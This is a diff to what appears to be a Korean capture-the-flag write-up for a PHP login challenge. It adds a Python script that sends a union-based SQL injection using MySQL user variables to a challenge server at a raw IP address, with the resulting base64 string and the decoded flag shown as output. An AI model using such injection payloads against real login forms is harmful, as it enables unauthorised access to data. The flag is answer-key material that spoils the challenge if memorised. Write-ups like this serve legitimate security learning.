@@ -67,4 +67,20 @@ if ( isset($id) || isset($pw) ) {
 
 결과적으로, `Hello SDNYMFJ7bXlzcWxfdmFyaWFibGVfaXNfc29fdXNlZnVsfQ=` 라는 스트링이 출력되었고 뒤에 `base64`에 `=` 패딩 하나더 추가 하여 디코딩 하면 플래그가 출력 됩니다.
 
-`H3X0R{mysql_variable_is_so_useful}`
+## Code
+
+```python
+import requests
+
+url = "http://13.124.1.51/web/prob15/index.php"
+params = {
+	"id": "1' union select @t:=",
+	"pw": ",@t;-- -"
+}
+r = requests.get(url, params=params)
+print r.content
+
+# result
+# SDNYMFJ7bXlzcWxfdmFyaWFibGVfaXNfc29fdXNlZnVsfQ==
+# H3X0R{mysql_variable_is_so_useful}
+```
